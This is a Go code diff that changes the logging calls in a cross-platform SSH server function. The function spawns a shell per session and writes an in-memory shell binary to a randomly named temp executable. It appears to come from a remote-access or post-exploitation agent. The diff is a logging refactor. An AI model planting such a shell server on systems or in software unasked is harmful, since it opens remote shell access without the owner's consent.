@@ -30,7 +30,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	if isMemShell {
 		shellData, err := util.ReadFileAgent(shell)
 		if err != nil {
-			logging.Printf("sshd: read shell %s from memory: %v", shell, err)
+			logging.Infof("sshd: read shell %s from memory: %v", shell, err)
 			return err
 		}
 		// on Windows we don't have a memory execution loader for EXEs yet
@@ -38,7 +38,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		tempExe := fmt.Sprintf("%s/%s.exe", os.TempDir(), util.RandMD5String())
 		err = util.WriteFileAgent(tempExe, shellData, 0o755)
 		if err != nil {
-			logging.Printf("sshd: write temp shell %s: %v", tempExe, err)
+			logging.Infof("sshd: write temp shell %s: %v", tempExe, err)
 			return err
 		}
 		exe = tempExe
@@ -60,7 +60,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		},
 	}
 
-	logging.Printf("Using %s shell", strconv.Quote(shell))
+	logging.Infof("Using %s shell", strconv.Quote(shell))
 
 	ssh_server.Handle(func(s ssh.Session) {
 		cmd := exec.Command(exe, args...)
@@ -79,13 +79,13 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		// console configs
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
-			logging.Printf("Got an SSH PTY request: %s", ptyReq.Term)
+			logging.Infof("Got an SSH PTY request: %s", ptyReq.Term)
 			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
 		} else {
 			logging.Print("Got a non-PTY SSH request, might not work")
 		}
 
-		logging.Printf("sshd execute: %v, args(%d)=%v, env=%s",
+		logging.Infof("sshd execute: %v, args(%d)=%v, env=%s",
 			cmd, len(cmd.Args), cmd.Args, cmd.Env)
 
 		// use winpty PTY implementation if ConPTY is unsupported
@@ -100,14 +100,14 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			win := <-winCh
 			if win.Width <= 0 || win.Height <= 0 {
 				time.Sleep(5 * time.Second)
-				logging.Printf("w/h is 0, aborting")
+				logging.Infof("w/h is 0, aborting")
 			}
 			os.Setenv("TERM_SIZE", fmt.Sprintf("%dx%d", win.Width, win.Height))
 
 			// winpty
 			err = winpty_shell_proc.SetSize(win.Width, win.Height)
 			if err != nil {
-				logging.Printf("Error resizing winpty console: %v", err)
+				logging.Infof("Error resizing winpty console: %v", err)
 			}
 		}
 
@@ -155,7 +155,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		}
 	})
 
-	logging.Printf("Starting SSHD on port %s...", port)
+	logging.Infof("Starting SSHD on port %s...", port)
 	return ssh_server.ListenAndServe()
 }
 
@@ -167,7 +167,7 @@ func IsConPTYSupported() bool {
 	}
 	_, err = windows.GetProcAddress(k32dll, "CreatePseudoConsole")
 	if err == nil {
-		logging.Printf("ConPTY is supported")
+		logging.Infof("ConPTY is supported")
 		return true
 	}
 
